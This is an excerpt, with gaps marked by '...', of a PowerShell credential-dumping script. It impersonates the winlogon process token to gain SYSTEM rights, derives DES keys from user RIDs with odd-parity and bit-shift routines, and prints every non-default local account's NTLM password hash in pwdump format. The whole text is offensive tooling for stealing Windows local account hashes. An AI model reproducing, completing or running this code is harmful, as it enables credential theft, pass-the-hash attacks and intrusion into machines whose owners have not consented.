...
function IAS {
    ...
    $a = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id

    if (($b = [impsys.win32]::OpenProcess(0x400,$true,[Int32]$a)) -eq [IntPtr]::Zero)
    {$c = [Runtime.InteropServices.Marshal]::GetLastWin32Error()}

    $d = [IntPtr]::Zero
    if (-not [impsys.win32]::OpenProcessToken($b,0x0E,[ref]$d))
    {$c = [Runtime.InteropServices.Marshal]::GetLastWin32Error()}
...
$odd_parity = @(
    ...
    $0 = @()
    $0 += bitshift $s[0] -1
    $0 += (bitshift ($s[0] -band 0x01) 6) -bor (bitshift $s[1] -2)
    $0 += (bitshift ($s[1] -band 0x03) 5) -bor (bitshift $s[2] -3)
    $0 += (bitshift ($s[2] -band 0x07) 4) -bor (bitshift $s[3] -4)
    $0 += (bitshift ($s[3] -band 0x0F) 3) -bor (bitshift $s[4] -5)
    $0 += (bitshift ($s[4] -band 0x1F) 2) -bor (bitshift $s[5] -6)
    $0 += (bitshift ($s[5] -band 0x3F) 1) -bor (bitshift $s[6] -7)
    $0 += $s[6] -band 0x7F
    $0[0] = $odd_parity[(bitshift $0[0] 1)]
    $0[1] = $odd_parity[(bitshift $0[1] 1)]
    $0[2] = $odd_parity[(bitshift $0[2] 1)]
    $0[3] = $odd_parity[(bitshift $0[3] 1)]
    $0[4] = $odd_parity[(bitshift $0[4] 1)]
    $0[5] = $odd_parity[(bitshift $0[5] 1)]
    $0[6] = $odd_parity[(bitshift $0[6] 1)]
    $0[7] = $odd_parity[(bitshift $0[7] 1)]
    $0
}
function bitshift($x, $c){return [math]::Floor($x * [math]::Pow(2, $c))}
$users = IAS -Process {GNLPH}
$excludedUsernames = @("Guest", "DefaultAccount", "WDAGUtilityAccount")
foreach ($user in $users) {
if ($user.Username -notin $excludedUsernames){
    $output = "$($user.Username):$($user.RID):aad3b435b51404eeaad3b435b51404ee:$($user.NTLM.ToLower()):::"
    $Output
        }
    }
}
